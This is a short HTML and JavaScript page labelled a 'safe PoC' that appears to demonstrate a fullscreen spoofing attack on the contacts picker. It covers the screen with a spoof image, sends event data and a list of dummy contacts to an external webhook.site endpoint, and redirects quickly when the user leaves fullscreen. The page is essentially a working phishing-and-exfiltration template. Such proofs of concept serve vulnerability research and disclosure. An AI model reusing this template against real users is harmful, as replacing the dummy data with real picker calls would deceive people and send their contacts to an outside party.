<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Contacts Picker Demo (Safe PoC)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: sans-serif;
      color: #fff;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
    }

    #content {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }

    button {
      padding: 16px 24px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      background: #1a73e8;
      color: #fff;
    }
  </style>
</head>

<body>

<img id="spoof" src="spoof.png" alt="spoof">

<div id="content">
  <div>
    <h1>Click anywhere to start demo</h1>
    <button id="start">Open Contacts</button>
  </div>
</div>

<script>
const WEBHOOK = "https://webhook.site/c28e63ae-558e-47e6-84d1-3ca7c07cacc4";

function sendToWebhook(data) {
  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  }).catch(() => {});
}

function dummyContacts() {
  return [
    { name: "John Doe", phone: "+628123456789" },
    { name: "Jane Doe", phone: "+628987654321" }
  ];
}

document.getElementById("start").addEventListener("click", async () => {

  // 1️⃣ Simulate contacts picker opened
  sendToWebhook({
    event: "contacts_picker_opened",
    time: new Date().toISOString()
  });

  // 2️⃣ Show spoof overlay
  document.getElementById("spoof").style.display = "block";
  document.getElementById("content").style.display = "none";

  // 3️⃣ Request fullscreen (if allowed)
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen().catch(() => {});
  }

  // 4️⃣ Simulate user selecting contacts
  setTimeout(() => {
    const contacts = dummyContacts();

    sendToWebhook({
      event: "contacts_selected",
      contacts,
      time: new Date().toISOString()
    });
  }, 1200);
});

// 5️⃣ Detect exit fullscreen → redirect fast
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    sendToWebhook({
      event: "exit_fullscreen",
      time: new Date().toISOString()
    });

    // redirect cepat
    setTimeout(() => {
      location.href = "https://google.com";
    }, 50);
  }
});
</script>

</body>
</html>
